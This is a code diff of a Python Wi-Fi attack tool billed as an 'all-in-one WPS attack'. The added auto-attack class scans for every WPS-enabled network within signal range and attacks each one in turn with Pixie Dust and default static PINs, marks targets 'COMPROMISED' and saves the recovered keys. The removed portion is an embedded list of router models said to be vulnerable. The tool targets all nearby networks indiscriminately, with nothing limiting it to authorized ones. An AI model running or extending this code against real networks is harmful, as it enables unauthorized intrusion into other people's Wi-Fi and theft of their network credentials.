+                print(f'{Colors.RED}[!] No network selected{Colors.RESET}')
+                break
+            
+            print(f'{Colors.CYAN}[*] Selected BSSID: {bssid}{Colors.RESET}')
+            print(f'{Colors.CYAN}[*] Starting attack with Pixie Dust + Force + Loop{Colors.RESET}')
+            print()
+            
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.pbc:
-                companion.single_connection(pbc_mode=True)
+            success = companion.single_connection(
+                bssid, 
+                args.pin, 
+                args.pixie_dust,
+                args.show_pixie_cmd, 
+                args.pixie_force
+            )
+            
+            if success:
+                print(f'{Colors.GREEN}{Colors.BOLD}[+] ✅ Target COMPROMISED!{Colors.RESET}')
             else:
-                if not args.bssid:
-                    try:
-                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                            vuln_list = file.read().splitlines()
-                    except FileNotFoundError:
-                        # Use embedded vulnerability database if external file not found
-                        vuln_list = VULN_DATABASE.strip().splitlines()
-                    scanner = WiFiScanner(args.interface, vuln_list)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
-
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                    else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
-                                                    args.show_pixie_cmd, args.pixie_force)
-            if not args.loop:
+                print(f'{Colors.RED}{Colors.BOLD}[-] ❌ Attack failed{Colors.RESET}')
+            
+            print()
+            cont = input(f'{Colors.YELLOW}[?] Continue with another target? [Y/n] {Colors.RESET}')
+            if cont.lower() == 'n':
                 break
-            else:
-                args.bssid = None
+                
         except KeyboardInterrupt:
-            if args.loop:
-                if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…")
-                    break
-                else:
-                    args.bssid = None
+            print(f'\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}')
+            break
+    
+    print_footer()
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# CLEAN DASHBOARD UI
+# ═══════════════════════════════════════════════════════════════════════
+
+class AutoAttackDashboard:
+    """Clean professional dashboard"""
+    
+    def __init__(self):
+        self.width = os.get_terminal_size().columns
+        self.start_time = datetime.now()
+        
+        self.status = "INIT"
+        self.total_targets = 0
+        self.current_target = 0
+        self.total_success = 0
+        self.total_fail = 0
+        self.total_skipped = 0
+        self.current_bssid = ""
+        self.current_essid = ""
+        self.current_signal = 0
+        self.current_pin = ""
+        self.current_method = ""
+        self.current_phase = ""
+        self.current_step = ""
+        self.assoc_count = 0
+        self.loop_count = 0
+        self.logs = []
+        self.complete = False
+        self.interface = ""
+        self.skip_reason = ""
+        
+    def c(self, text, color=None, bold=False):
+        if color == 'g': c = Colors.GREEN
+        elif color == 'r': c = Colors.RED
+        elif color == 'y': c = Colors.YELLOW
+        elif color == 'b': c = Colors.BLUE
+        elif color == 'c': c = Colors.CYAN
+        elif color == 'm': c = Colors.MAGENTA
+        elif color == 'gray': c = Colors.GRAY
+        else: c = ''
+        bold_text = Colors.BOLD if bold else ''
+        return f"{bold_text}{c}{text}{Colors.RESET}"
+    
+    def clear(self):
+        os.system('clear')
+    
+    def render(self):
+        self.clear()
+        elapsed = str(datetime.now() - self.start_time).split('.')[0]
+        
+        print(self.c("═" * self.width, 'c'))
+        print(self.c(" ALL-IN-ONE WPS ATTACK v16.0 ".center(self.width), 'c', True))
+        print(self.c(f" Interface: {self.interface} | Started: {self.start_time.strftime('%H:%M:%S')} | Uptime: {elapsed}".center(self.width), 'gray'))
+        print(self.c("═" * self.width, 'c'))
+        print()
+        
+        status_text = "STATUS"
+        if self.complete:
+            status_val = self.c("✓ COMPLETE", 'g', True)
+        elif self.status == "SUCCESS":
+            status_val = self.c("✓ SUCCESS", 'g', True)
+        elif self.status == "ATTACKING":
+            status_val = self.c("► ATTACKING", 'y', True)
+        elif self.status == "SCANNING":
+            status_val = self.c("◎ SCANNING", 'b', True)
+        elif self.status == "SKIPPED":
+            status_val = self.c("⏭ SKIPPED", 'm', True)
+        else:
+            status_val = self.c("• INIT", 'gray')
+        
+        total = max(1, self.total_targets)
+        progress_pct = (self.current_target / total) * 100 if self.total_targets > 0 else 0
+        bar_len = 30
+        filled = int(bar_len * progress_pct / 100)
+        bar = "[" + self.c("█" * filled, 'c') + "░" * (bar_len - filled) + "]"
+        progress_text = f"{self.current_target}/{self.total_targets}"
+        
+        print(f" {self.c(status_text, 'gray')} {status_val}  {bar} {self.c(progress_text, 'c')}")
+        print()
+        
+        print(self.c("┌" + "─" * (self.width - 2) + "┐", 'gray'))
+        if self.complete:
+            print(self.c("│" + " ALL TARGETS PROCESSED ".center(self.width - 2) + "│", 'g', True))
+        else:
+            print(self.c("│" + f" TARGET {self.current_target}/{self.total_targets} ".center(self.width - 2) + "│", 'gray', True))
+        print(self.c("├" + "─" * (self.width - 2) + "┤", 'gray'))
+        
+        row2a = f" │ BSSID: {self.c(self.current_bssid or '—', 'c')}"
+        row2a += " " * (20 - len(self.current_bssid or '—'))
+        row2a += f" │ ESSID: {self.c(self.current_essid or '—', 'c')}"
+        row2a += " " * (20 - len(self.current_essid or '—'))
+        row2a += f" │ SIGNAL: {self.c(str(self.current_signal) + 'dBm' if self.current_signal else '—', 'y')}"
+        row2a += " " * (12 - len(str(self.current_signal) if self.current_signal else '—'))
+        row2a += f" │ ASSOC: {self.c(str(self.assoc_count), 'm' if self.assoc_count >= 6 else 'gray')}"
+        row2a += " " * (7 - len(str(self.assoc_count)))
+        row2a += f" │ LOOP: {self.c(str(self.loop_count), 'r' if self.loop_count >= 5 else 'gray')}"
+        row2a += " " * (7 - len(str(self.loop_count)))
+        row2a += "│"
+        print(self.c(row2a, 'gray'))
+        
+        row2b = f" │ PHASE: {self.c(self.current_phase.upper() if self.current_phase else '—', 'b')}"
+        row2b += " " * (20 - len(self.current_phase.upper() if self.current_phase else '—'))
+        row2b += f" │ STEP: {self.c(self.current_step or '—', 'b')}"
+        row2b += " " * (20 - len(self.current_step or '—'))
+        row2b += f" │ METHOD: {self.c(self.current_method or '—', 'm')}"
+        row2b += " " * (20 - len(self.current_method or '—'))
+        row2b += "│"
+        print(self.c(row2b, 'gray'))
+        
+        if self.current_pin:
+            row2c = f" │ PIN: {self.c(self.current_pin, 'g', True)}"
+            row2c += " " * (self.width - len(row2c) - 3)
+            row2c += "│"
+            print(self.c(row2c, 'gray'))
+        
+        if self.skip_reason:
+            row2d = f" │ SKIP REASON: {self.c(self.skip_reason, 'r')}"
+            row2d += " " * (self.width - len(row2d) - 3)
+            row2d += "│"
+            print(self.c(row2d, 'gray'))
+        
+        print(self.c("└" + "─" * (self.width - 2) + "┘", 'gray'))
+        print()
+        
+        print(self.c("┌" + "─" * (self.width - 2) + "┐", 'gray'))
+        print(self.c("│" + " STATISTICS ".center(self.width - 2) + "│", 'gray', True))
+        print(self.c("├" + "─" * (self.width - 2) + "┤", 'gray'))
+        
+        total_attempted = self.total_success + self.total_fail + self.total_skipped
+        success_rate = f"{self.total_success/max(1,total_attempted)*100:.1f}%"
+        
+        row3 = f" │ TARGETS: {self.c(str(self.total_targets), 'c')}"
+        row3 += " " * (15 - len(str(self.total_targets)))
+        row3 += f" │ SUCCESS: {self.c(str(self.total_success), 'g')}"
+        row3 += " " * (15 - len(str(self.total_success)))
+        row3 += f" │ FAILED: {self.c(str(self.total_fail), 'r')}"
+        row3 += " " * (15 - len(str(self.total_fail)))
+        row3 += f" │ SKIPPED: {self.c(str(self.total_skipped), 'm')}"
+        row3 += " " * (15 - len(str(self.total_skipped)))
+        row3 += f" │ RATE: {self.c(success_rate, 'y')}"
+        row3 += " " * (15 - len(success_rate))
+        row3 += "│"
+        print(self.c(row3, 'gray'))
+        
+        print(self.c("└" + "─" * (self.width - 2) + "┘", 'gray'))
+        print()
+        
+        print(self.c("┌" + "─" * (self.width - 2) + "┐", 'gray'))
+        if self.complete:
+            print(self.c("│" + " FINAL LOGS ".center(self.width - 2) + "│", 'g', True))
+        else:
+            print(self.c("│" + f" SYSTEM LOGS ({len(self.logs)} entries) ".center(self.width - 2) + "│", 'gray', True))
+        print(self.c("├" + "─" * (self.width - 2) + "┤", 'gray'))
+        
+        log_lines = self.logs[-12:] if self.logs else ["[•] System ready"]
+        for log in log_lines:
+            if len(log) > self.width - 6:
+                log = log[:self.width - 9] + "..."
+            
+            if '[+]' in log or 'SUCCESS' in log:
+                log = self.c(log, 'g')
+            elif '[-]' in log or 'FAIL' in log or 'NACK' in log:
+                log = self.c(log, 'r')
+            elif '[*]' in log:
+                log = self.c(log, 'b')
+            elif '[P]' in log:
+                log = self.c(log, 'c')
+            elif '[!]' in log:
+                log = self.c(log, 'y')
+            elif '⏭' in log or 'SKIPPED' in log:
+                log = self.c(log, 'm')
+            elif '★' in log:
+                log = self.c(log, 'g', True)
             else:
-                print("\nAborting…")
+                log = self.c(log, 'gray')
+            
+            print(self.c(f"│ {log}".ljust(self.width - 1) + "│", 'gray'))
+        
+        print(self.c("└" + "─" * (self.width - 2) + "┘", 'gray'))
+        print()
+        
+        print(self.c("═" * self.width, 'c'))
+        if self.complete:
+            footer = " ✅ ATTACK COMPLETE | PRESS ENTER TO ENTER INTERACTIVE MODE "
+            print(self.c(footer.center(self.width), 'g', True))
+        else:
+            footer = " ATTACKING... | PRESS CTRL+C TO ABORT "
+            print(self.c(footer.center(self.width), 'gray'))
+        print(self.c("═" * self.width, 'c'))
+        print()
+        print(self.c(" Designed by SYLHETYHACKVENGER (THE-ERROR808) ".center(self.width), 'm', True))
+    
+    def update(self, **kwargs):
+        for key, value in kwargs.items():
+            if hasattr(self, key):
+                setattr(self, key, value)
+        self.render()
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MAIN AUTO-ATTACK CLASS
+# ═══════════════════════════════════════════════════════════════════════
+
+class AutoWPSAttack:
+    """Single-pass automatic attack with association counter & loop detection"""
+    
+    def __init__(self, interface, save_result=False):
+        self.interface = interface
+        self.save_result = save_result
+        self.dashboard = AutoAttackDashboard()
+        self.dashboard.interface = interface
+        self.generator = WPSpin()
+        self.running = True
+        self.max_associations = 6
+        self.max_scan_loops = 5
+        
+    def scan_networks(self):
+        self.dashboard.update(status="SCANNING", current_phase="scan", 
+                              current_step="Scanning for WPS networks",
+                              logs=["[*] Scanning for WPS networks in range..."])
+        
+        try:
+            scanner = WiFiScanner(self.interface)
+            networks = scanner.iw_scanner()
+            
+            if not networks:
+                self.dashboard.update(logs=["[-] No WPS networks found"])
+                return []
+            
+            targets = []
+            skipped = 0
+            for n, network in networks.items():
+                bssid = network['BSSID']
+                essid = network['ESSID']
+                signal = network['Level']
+                
+                if -75 <= signal <= -20:
+                    targets.append({
+                        'bssid': bssid,
+                        'essid': essid,
+                        'signal': signal,
+                        'security': network['Security type'],
+                        'wps_locked': network['WPS locked']
+                    })
+                else:
+                    skipped += 1
+            
+            targets.sort(key=lambda x: x['signal'], reverse=True)
+            
+            self.dashboard.update(logs=[f"[+] Found {len(targets)} targets in range (-20 to -75 dBm)"])
+            if skipped > 0:
+                self.dashboard.update(logs=[f"[*] Skipped {skipped} networks (outside range)"])
+            
+            return targets
+            
+        except Exception as e:
+            self.dashboard.update(logs=[f"[!] Scan error: {str(e)}"])
+            return []
+    
+    def attack_target(self, target):
+        bssid = target['bssid']
+        essid = target['essid']
+        signal = target['signal']
+        
+        self.dashboard.update(
+            current_bssid=bssid,
+            current_essid=essid,
+            current_signal=signal,
+            assoc_count=0,
+            loop_count=0,
+            skip_reason="",
+            status="ATTACKING",
+            current_pin="",
+            current_method="",
+            current_phase="",
+            current_step="",
+            logs=[f"[*] Processing: {bssid} | {essid} | {signal}dBm"]
+        )
+        
+        if target.get('wps_locked', False):
+            self.dashboard.update(skip_reason="WPS Locked", status="SKIPPED",
+                                  logs=[f"[!] WPS locked on {bssid} - skipping"])
+            self.dashboard.total_skipped += 1
+            return False
+        
+        # Method 1: Pixie Dust (standard)
+        self.dashboard.update(current_phase="pixie", current_method="Pixie Dust",
+                              current_step="Standard", 
+                              logs=["[*] Method 1: Pixie Dust (standard)"])
+        
+        try:
+            companion = Companion(self.interface, self.save_result, print_debug=False)
+            companion.max_associations = self.max_associations
+            companion.max_scan_loops = self.max_scan_loops
+            companion.single_connection(bssid, pixiemode=True, pixieforce=False)
+            
+            if companion.connection_status.status == 'SKIPPED':
+                reason = f"Associations: {companion.connection_status.assoc_count} | Loops: {companion.connection_status.scan_loop_count}"
+                self.dashboard.update(assoc_count=companion.connection_status.assoc_count,
+                                      loop_count=companion.connection_status.scan_loop_count,
+                                      skip_reason=reason, status="SKIPPED",
+                                      logs=[f"[!] ⏭ Skipped {bssid} - {reason}"])
+                self.dashboard.total_skipped += 1
+                return False
+            
+            if companion.connection_status.status == 'GOT_PSK':
+                pin = companion.connection_status.wpa_psk
+                self.dashboard.update(current_pin=pin, status="SUCCESS",
+                                      logs=[f"[+] ★ SUCCESS! PIN: {pin}"])
+                return True
+        except Exception as e:
+            self.dashboard.update(logs=[f"[!] Pixie error: {str(e)}"])
+        
+        # Method 2: Pixie Dust (full range)
+        self.dashboard.update(current_phase="pixie", current_method="Pixie Dust",
+                              current_step="Full Range",
+                              logs=["[*] Method 2: Pixie Dust (full range)"])
+        
+        try:
+            companion = Companion(self.interface, self.save_result, print_debug=False)
+            companion.max_associations = self.max_associations
+            companion.max_scan_loops = self.max_scan_loops
+            companion.single_connection(bssid, pixiemode=True, pixieforce=True)
+            
+            if companion.connection_status.status == 'SKIPPED':
+                reason = f"Associations: {companion.connection_status.assoc_count} | Loops: {companion.connection_status.scan_loop_count}"
+                self.dashboard.update(assoc_count=companion.connection_status.assoc_count,
+                                      loop_count=companion.connection_status.scan_loop_count,
+                                      skip_reason=reason, status="SKIPPED",
+                                      logs=[f"[!] ⏭ Skipped {bssid} - {reason}"])
+                self.dashboard.total_skipped += 1
+                return False
+            
+            if companion.connection_status.status == 'GOT_PSK':
+                pin = companion.connection_status.wpa_psk
+                self.dashboard.update(current_pin=pin, status="SUCCESS",
+                                      logs=[f"[+] ★ SUCCESS! PIN: {pin}"])
+                return True
+        except Exception as e:
+            self.dashboard.update(logs=[f"[!] Pixie error: {str(e)}"])
+        
+        # Method 3: Static Pins
+        self.dashboard.update(current_phase="static", current_method="Static PIN",
+                              current_step="Vendor pins",
+                              logs=["[*] Method 3: Static PIN attack"])
+        
+        pins = []
+        try:
+            all_pins = self.generator.getAll(bssid, get_static=True)
+            for p in all_pins:
+                if 'Static PIN' in p['name']:
+                    pins.append(p['pin'])
+                    if len(pins) >= 3:
+                        break
+        except:
+            pass
+        
+        if len(pins) < 3:
+            pins = ['12345670', '00000000', '88888880']
+            self.dashboard.update(logs=["[*] Using default pins"])
+        
+        for i, pin in enumerate(pins[:3], 1):
+            self.dashboard.update(current_pin=pin, current_step=f"PIN {i}/3",
+                                  logs=[f"[*] Trying: {pin}"])
+            
+            try:
+                companion = Companion(self.interface, self.save_result, print_debug=False)
+                companion.max_associations = self.max_associations
+                companion.max_scan_loops = self.max_scan_loops
+                companion.single_connection(bssid, pin=pin, pixiemode=False)
+                
+                if companion.connection_status.status == 'SKIPPED':
+                    reason = f"Associations: {companion.connection_status.assoc_count} | Loops: {companion.connection_status.scan_loop_count}"
+                    self.dashboard.update(assoc_count=companion.connection_status.assoc_count,
+                                          loop_count=companion.connection_status.scan_loop_count,
+                                          skip_reason=reason, status="SKIPPED",
+                                          logs=[f"[!] ⏭ Skipped {bssid} - {reason}"])
+                    self.dashboard.total_skipped += 1
+                    return False
+                
+                if companion.connection_status.status == 'GOT_PSK':
+                    self.dashboard.update(status="SUCCESS",
+                                          logs=[f"[+] ★ SUCCESS! PIN: {pin}"])
+                    return True
+            except Exception as e:
+                self.dashboard.update(logs=[f"[!] Error: {str(e)}"])
+            
+            self.dashboard.update(logs=[f"[-] {pin} rejected"])
+            time.sleep(1)
+        
+        self.dashboard.update(logs=[f"[-] All methods failed for {bssid}"])
+        return False
+    
+    def run(self):
+        self.dashboard.update(logs=["[+] System initialized"])
+        self.dashboard.update(logs=["[*] Starting single-pass automatic attack..."])
+        self.dashboard.update(logs=[f"[*] Max associations per target: {self.max_associations}"])
+        self.dashboard.update(logs=[f"[*] Max scan-associate loops: {self.max_scan_loops}"])
+        self.dashboard.update(logs=["[*] Targeting ALL networks between -20 and -75 dBm"])
+        time.sleep(1)
+        
+        targets = self.scan_networks()
+        
+        if not targets:
+            self.dashboard.update(logs=["[-] No targets found in range"])
+            self.dashboard.complete = True
+            self.dashboard.update(status="COMPLETE")
+            self.dashboard.update(logs=["[✅] Attack complete - no targets found"])
+            return
+        
+        self.dashboard.total_targets = len(targets)
+        self.dashboard.update(logs=[f"[+] {len(targets)} targets found"])
+        self.dashboard.update(logs=["[*] Starting sequential attack..."])
+        time.sleep(1)
+        
+        for idx, target in enumerate(targets, 1):
+            if not self.running:
                 break
+            
+            self.dashboard.current_target = idx
+            success = self.attack_target(target)
+            
+            if success:
+                self.dashboard.total_success += 1
+                self.dashboard.update(logs=[f"[+] ✅ Target {idx}/{len(targets)} COMPROMISED!"])
+            else:
+                if self.dashboard.current_bssid and self.dashboard.current_bssid == target['bssid']:
+                    if self.dashboard.status != 'SKIPPED':
+                        self.dashboard.total_fail += 1
+                        self.dashboard.update(logs=[f"[-] ❌ Target {idx}/{len(targets)} failed"])
+            
+            if idx < len(targets):
+                self.dashboard.update(logs=[f"[*] Waiting 2s before next target..."])
+                time.sleep(2)
+        
+        self.dashboard.complete = True
+        self.dashboard.update(status="COMPLETE")
+        self.dashboard.update(logs=["[✅] ★ ATTACK COMPLETE! ★"])
+        self.dashboard.update(logs=[f"[+] Summary: {self.dashboard.total_success}/{len(targets)} successful"])
+        self.dashboard.update(logs=[f"[+] Skipped: {self.dashboard.total_skipped} targets"])
+        self.dashboard.update(logs=[f"[+] Success rate: {self.dashboard.total_success/max(1,len(targets))*100:.1f}%"])
+        
+        if self.dashboard.total_success > 0:
+            self.dashboard.update(logs=["[+] Check reports/ for saved credentials"])
+        
+        self.dashboard.update(logs=["[*] Press ENTER to enter interactive mode"])
 
-    if args.iface_down:
-        ifaceUp(args.interface, down=True)
 
-    if args.mtk_wifi:
-        wmtWifi_device.write_text("0")
+# ═══════════════════════════════════════════════════════════════════════
+# MAIN ENTRY POINT
+# ═══════════════════════════════════════════════════════════════════════
 
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# EMBEDDED VULNERABILITY DATABASE
-# ═══════════════════════════════════════════════════════════════════════════════
-# List of device models vulnerable to Pixie Dust attack
-# This database is embedded to eliminate external file dependencies
-
-VULN_DATABASE = """ADSL Router EV-2006-07-27
-ADSL RT2860
-AIR3G WSC Wireless Access Point AIR3G WSC Device
-AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP
-Archer_A9 1.0
-ArcherC20i 1.0
-Archer A2 5.0
-Archer A5 4.0
-Archer C2 1.0
-Archer C2 3.0
-Archer C5 4.0
-Archer C6 3.20
-Archer C6U 1.0.0
-Archer C20 1.0
-Archer C20 4.0
-Archer C20 5.0
-Archer C50 1.0
-Archer C50 3.0
-Archer C50 4.0
-Archer C50 5.0
-Archer C50 6.0
-Archer MR200 1.0
-Archer MR200 4.0
-Archer MR400 4.2
-Archer MR200 5.0
-Archer VR300 1.20
-Archer VR400 3.0
-Archer VR2100 1.0
-B-LINK 123456
-Belkin AP EV-2012-09-01
-DAP-1360 DAP-1360
-DIR-635 B3
-DIR-819 v1.0.1
-DIR-842 DIR-842
-DWR-921C3 WBR-0001
-D-Link N Router GO-RT-N150
-D-Link Router DIR-605L
-D-Link Router DIR-615H1
-D-Link Router DIR-655
-D-Link Router DIR-809
-D-Link Router GO-RT-N150
-Edimax Edimax
-EC120-F5 1.0
-EC220-G5 2.0
-EV-2009-02-06
-Enhanced Wireless Router F6D4230-4 v1
-Home Internet Center KEENETIC series
-Home Internet Center Keenetic series
-Huawei Wireless Access Point RT2860
-JWNR2000v2(Wireless AP) JWNR2000v2
-Keenetic Keenetic series
-Linksys Wireless Access Point EA7500
-Linksys Wireless Router WRT110
-NBG-419N NBG-419N
-Netgear AP EV-2012-08-04
-NETGEAR Wireless Access Point NETGEAR
-NETGEAR Wireless Access Point R6220
-NETGEAR Wireless Access Point R6260
-N/A EV-2010-09-20
-Ralink Wireless Access Point RT2860
-Ralink Wireless Access Point WR-AC1210
-RTL8196E
-RTL8xxx EV-2009-02-06
-RTL8xxx EV-2010-09-20
-RTL8xxx RTK_ECOS
-RT-G32 1234
-Sitecom Wireless Router 300N X2 300N
-Smart Router R3 RT2860
-Tenda 123456
-Timo RA300R4 Timo RA300R4
-TD-W8151N RT2860
-TD-W8901N RT2860
-TD-W8951ND RT2860
-TD-W9960 1.0
-TD-W9960 1.20
-TD-W9960v 1.0
-TD-W8968 2.0
-TEW-731BR TEW-731BR
-TL-MR100 1.0
-TL-MR3020 3.0
-TL-MR3420 5.0
-TL-MR6400 3.0
-TL-MR6400 4.0
-TL-WA855RE 4.0
-TL-WR840N 4.0
-TL-WR840N 5.0
-TL-WR840N 6.0
-TL-WR841N 13.0
-TL-WR841N 14.0
-TL-WR841HP 5.0
-TL-WR842N 5.0
-TL-WR845N 3.0
-TL-WR845N 4.0
-TL-WR850N 1.0
-TL-WR850N 2.0
-TL-WR850N 3.0
-TL-WR1042N EV-2010-09-20
-Trendnet router TEW-625br
-Trendnet router TEW-651br
-VN020-F3 1.0
-VMG3312-T20A RT2860
-VMG8623-T50A RT2860
-WAP300N WAP300N
-WAP3205 WAP3205
-Wi-Fi Protected Setup Router RT-AC1200G+
-Wi-Fi Protected Setup Router RT-AX55
-Wi-Fi Protected Setup Router RT-N10U
-Wi-Fi Protected Setup Router RT-N12
-Wi-Fi Protected Setup Router RT-N12D1
-Wi-Fi Protected Setup Router RT-N12VP
-Wireless Access Point .
-Wireless Router 123456
-Wireless Router RTL8xxx EV-2009-02-06
-Wireless Router Wireless Router
-Wireless WPS Router <#ZVMODELVZ#>
-Wireless WPS Router RT-N10E
-Wireless WPS Router RT-N10LX
-Wireless WPS Router RT-N12E
-Wireless WPS Router RT-N12LX
-WN3000RP V3
-WN-200R WN-200R
-WPS Router (5G) RT-N65U
-WPS Router DSL-AC51
-WPS Router DSL-AC52U
-WPS Router DSL-AC55U
-WPS Router DSL-N14U-B1
-WPS Router DSL-N16
-WPS Router DSL-N17U
-WPS Router RT-AC750
-WPS Router RT-AC1200
-WPS Router RT-AC1200_V2
-WPS Router RT-AC1750
-WPS Router RT-AC750L
-WPS Router RT-AC1750U
-WPS Router RT-AC51
-WPS Router RT-AC51U
-WPS Router RT-AC52U
-WPS Router RT-AC52U_B1
-WPS Router RT-AC53
-WPS Router RT-AC57U
-WPS Router RT-AC65P
-WPS Router RT-AC85P
-WPS Router RT-N11P
-WPS Router RT-N12E
-WPS Router RT-N12E_B1
-WPS Router RT-N12 VP
-WPS Router RT-N12+
-WPS Router RT-N14U
-WPS Router RT-N56U
-WPS Router RT-N56UB1
-WPS Router RT-N65U
-WPS Router RT-N300
-WR5570 2011-05-13
-ZyXEL NBG-416N AP Router
-ZyXEL NBG-416N AP Router NBG-416N
-ZyXEL NBG-418N AP Router
-ZyXEL NBG-418N AP Router NBG-418N
-ZyXEL Wireless AP Router NBG-417N
-Modem/Router EV-2010-09-20
-RB06 RT2860
-RB03 RT2860
-Archer A5 1.0
-Archer A5 2.0
-Archer A5 3.0
-Archer A6 1.0
-Archer A6 2.0
-Archer A7 1.0
-Archer A7 2.0
-Archer A8 1.0
-Archer A9 2.0
-Archer A10 1.0
-Archer A20 1.0
-Archer A20 2.0
-Archer C2 2.0
-Archer C2 3.0
-Archer C2 4.0
-Archer C2 5.0
-Archer C2 6.0
-Archer C20 2.0
-Archer C20 3.0
-Archer C20 6.0
-Archer C20i 2.0
-Archer C20i 3.0
-Archer C24 1.0
-Archer C24 2.0
-Archer C25 1.0
-Archer C25 2.0
-Archer C40 1.0
-Archer C40 2.0
-Archer C50 2.0
-Archer C50 7.0
-Archer C55 1.0
-Archer C55 2.0
-Archer C58 1.0
-Archer C58 2.0
-Archer C59 1.0
-Archer C59 2.0
-Archer C60 1.0
-Archer C60 2.0
-Archer C60 3.0
-Archer C60 4.0
-Archer C60 5.0
-Archer C64 1.0
-Archer C64 2.0
-Archer C80 1.0
-Archer C80 2.0
-Archer C120 1.0
-Archer C120 2.0
-Archer C120 3.0
-Archer C230 1.0
-Archer C230 2.0
-Archer C260 1.0
-Archer C260 2.0
-Archer C320 1.0
-Archer C320 2.0
-Archer C400 1.0
-Archer C400 2.0
-Archer C540 1.0
-Archer C540 2.0
-Archer C540 3.0
-Archer D2 1.0
-Archer D2 2.0
-Archer D2 3.0
-Archer D5 1.0
-Archer D5 2.0
-Archer D5 3.0
-Archer D7 1.0
-Archer D7 2.0
-Archer D7 3.0
-Archer D8 1.0
-Archer D8 2.0
-Archer D8 3.0
-Archer D9 1.0
-Archer D9 2.0
-Archer D9 3.0
-Archer D20 1.0
-Archer D20 2.0
-Archer D20 3.0
-Archer D50 1.0
-Archer D50 2.0
-Archer D50 3.0
-Archer MR200 2.0
-Archer MR200 3.0
-Archer MR400 1.0
-Archer MR400 2.0
-Archer MR400 3.0
-Archer MR400 5.0
-Archer MR600 1.0
-Archer MR600 2.0
-Archer MR600 3.0
-Archer MR600 4.0
-Archer MR600 5.0
-Archer VR200 1.0
-Archer VR200 2.0
-Archer VR200 3.0
-Archer VR260 1.0
-Archer VR260 2.0
-Archer VR260 3.0
-Archer VR280 1.0
-Archer VR280 2.0
-Archer VR280 3.0
-Archer VR300 1.0
-Archer VR300 2.0
-Archer VR300 3.0
-Archer VR400 1.0
-Archer VR400 2.0
-Archer VR400 4.0
-Archer VR500 1.0
-Archer VR500 2.0
-Archer VR500 3.0
-Archer VR600 1.0
-Archer VR600 2.0
-Archer VR600 3.0
-Archer VR900 1.0
-Archer VR900 2.0
-Archer VR900 3.0
-Archer VR2100 2.0
-Archer VR2100 3.0
-Archer VR2100 4.0
-Archer VR2100 5.0
-TL-MR100 2.0
-TL-MR100 3.0
-TL-MR100 4.0
-TL-MR150 1.0
-TL-MR150 2.0
-TL-MR150 3.0
-TL-MR3020 1.0
-TL-MR3020 2.0
-TL-MR3020 4.0
-TL-MR3420 1.0
-TL-MR3420 2.0
-TL-MR3420 3.0
-TL-MR3420 4.0
-TL-MR6400 1.0
-TL-MR6400 2.0
-TL-MR6400 5.0
-TL-WA855RE 1.0
-TL-WA855RE 2.0
-TL-WA855RE 3.0
-TL-WA855RE 5.0
-TL-WA860RE 1.0
-TL-WA860RE 2.0
-TL-WA860RE 3.0
-TL-WA860RE 4.0
-TL-WA860RE 5.0
-TL-WR840N 1.0
-TL-WR840N 2.0
-TL-WR840N 3.0
-TL-WR841N 10.0
-TL-WR841N 11.0
-TL-WR841N 12.0
-TL-WR841N 15.0
-TL-WR841HP 1.0
-TL-WR841HP 2.0
-TL-WR841HP 3.0
-TL-WR841HP 4.0
-TL-WR842N 1.0
-TL-WR842N 2.0
-TL-WR842N 3.0
-TL-WR842N 4.0
-TL-WR845N 1.0
-TL-WR845N 2.0
-TL-WR845N 5.0
-TL-WR850N 4.0
-TL-WR902AC 1.0
-TL-WR902AC 2.0
-TL-WR902AC 3.0
-TL-WR902AC 4.0
-TL-WR902AC 5.0
-TL-WR1042ND 1.0
-TL-WR1042ND 2.0
-TL-WR1042ND 3.0
-TL-WR1042ND 4.0
-TL-WR1042ND 5.0
-DIR-300
-DIR-300A
-DIR-300B
-DIR-300C
-DIR-300D
-DIR-300E
-DIR-400
-DIR-400A
-DIR-400B
-DIR-400C
-DIR-400D
-DIR-400E
-DIR-500
-DIR-500A
-DIR-500B
-DIR-500C
-DIR-500D
-DIR-500E
-DIR-600
-DIR-600A
-DIR-600B
-DIR-600C
-DIR-600D
-DIR-600E
-DIR-601
-DIR-601A
-DIR-601B
-DIR-601C
-DIR-601D
-DIR-601E
-DIR-605
-DIR-605A
-DIR-605B
-DIR-605C
-DIR-605D
-DIR-605E
-DIR-605L A1
-DIR-605L B1
-DIR-605L C1
-DIR-605L D1
-DIR-605L E1
-DIR-615 A1
-DIR-615 A2
-DIR-615 B1
-DIR-615 B2
-DIR-615 C1
-DIR-615 C2
-DIR-615 C3
-DIR-615 D1
-DIR-615 D2
-DIR-615 D3
-DIR-615 E1
-DIR-615 E2
-DIR-615 E3
-DIR-615 E4
-DIR-615 F1
-DIR-615 F2
-DIR-615 F3
-DIR-615 G1
-DIR-615 G2
-DIR-615 G3
-DIR-615 H2
-DIR-615 H3
-DIR-615 I1
-DIR-615 I2
-DIR-615 I3
-DIR-615 J1
-DIR-615 J2
-DIR-615 J3
-DIR-615 K1
-DIR-615 K2
-DIR-615 K3
-DIR-615 L1
-DIR-615 L2
-DIR-615 L3
-DIR-615 M1
-DIR-615 M2
-DIR-615 M3
-DIR-615 N1
-DIR-615 N2
-DIR-615 N3
-DIR-620
-DIR-620 A1
-DIR-620 B1
-DIR-620 C1
-DIR-620 D1
-DIR-620 E1
-DIR-620 F1
-DIR-620 G1
-DIR-620 H1
-DIR-620 I1
-DIR-620 J1
-DIR-620 K1
-DIR-620 L1
-DIR-620 M1
-DIR-620 N1
-DIR-625
-DIR-625 A1
-DIR-625 B1
-DIR-625 C1
-DIR-625 D1
-DIR-625 E1
-DIR-628
-DIR-628 A1
-DIR-628 B1
-DIR-628 C1
-DIR-628 D1
-DIR-628 E1
-DIR-635 A1
-DIR-635 B1
-DIR-635 B2
-DIR-635 C1
-DIR-635 D1
-DIR-635 E1
-DIR-636L
-DIR-636L A1
-DIR-636L B1
-DIR-636L C1
-DIR-636L D1
